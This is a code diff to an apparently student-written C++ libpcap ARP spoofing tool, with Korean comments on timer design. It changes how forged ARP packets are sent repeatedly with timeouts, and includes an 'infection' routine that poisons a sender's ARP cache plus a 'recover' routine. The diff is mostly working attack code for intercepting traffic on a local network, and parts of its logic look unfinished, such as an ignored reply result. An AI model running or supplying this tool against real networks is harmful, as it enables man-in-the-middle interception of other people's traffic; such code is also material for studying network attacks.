@@ -10,6 +10,7 @@
 #include "arphdr.h"
 // thread
 #include <thread>
+#include <chrono>
 // getMyIp
 #include <stdio.h>
 #include <unistd.h>
@@ -88,22 +89,39 @@ EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, I
 	return packet;
 }
 
-int sendARP(EthArpPacket& packet, pcap_t* handle) {
-	// critical section
-	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	//
-	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-		return FAIL;
+int sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t sec) {
+	
+	for(int i = 0; i < times - 1; i++) {
+		// critical section
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		//
+		if (res != 0) {
+			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			return FAIL;
+		}
+		std::this_thread::sleep_for(std::chrono::seconds(sec)); // 마지막에는 필요 없는데 어케 해결할까 1. if  2. ??
 	}
 	return SUCCESS;
 }
 
-int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table) {
+int parsePacket(pcap_t* handle, EthArpPacket send, map<Ip, Mac> table, uint32_t time) {
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
 
+
+	// 타이머 구현하는 법
+	// 1. 시작 시각하고 현재 시각의 차이를 구한다 -> sleep_for 내부도 이렇게 작동함 ㅋㅋ
+	// 2. sleep_for을 쓰레드로 구현해놓고 어떤 전역 변수값으로 전달?
+	// start
+	auto startTime = std::chrono::system_clock::now();
+
 	while (1) {
+		auto endTime = std::chrono::system_clock::now();
+		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
+		if(diff.count() > time) {
+			cout << "cannot receive reply packet" << endl;
+			return FAIL;
+		}
 		// critical section
 		int res = pcap_next_ex(handle, &pkheader, &packet);
 		//
@@ -137,7 +155,14 @@ int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table) {
 
 int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
 	EthArpPacket packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
-	return sendARP(packet, handle) && parsePacket(handle, packet, table);
+	// 쓰레드로 1초에 1번씩 전송하도록 함 
+	// 종료 변수 냅두고
+	sendARP(packet, handle, 10, 1);
+
+	// 10초 지나고 타임 아웃
+	// 쓰레드로 만들어서 join 끝나면 FAIL로~
+	parsePacket(handle, packet, table, 10);
+	return 1;
 }
 
 Ip getMyIp(char* dev) {
@@ -171,7 +196,7 @@ int getMyInfo(char* dev, map<Ip, Mac>& table) {
 
 void recover(pcap_t* handle, map<Ip, Mac>& table, Ip& sender, Ip& target) {
 	EthArpPacket packet = fillPacket(table.find(target)->second, table.find(sender)->second, table.find(target)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
-	sendARP(packet, handle);
+	sendARP(packet, handle, 10, 1);
 }
 
 void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target) {
@@ -184,8 +209,8 @@ void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target) 
 	cout << "send" << endl;
 	int i = 0;
 	while(i < 5) {
-		std::this_thread::sleep_for(std::chrono::milliseconds(3000));
-		sendARP(packet, handle);
+		std::this_thread::sleep_for(std::chrono::seconds(3));
+		sendARP(packet, handle, 10, 1);
 		i++;
 	}
 	recover(handle, table, sender, target);
@@ -208,6 +233,7 @@ void watchPacket(pcap_t* handle, map<Ip, Mac> table) {
 		// critical section
 		int res = pcap_next_ex(handle, &pkheader, &packet);
 		//
+	}
 }
 
 
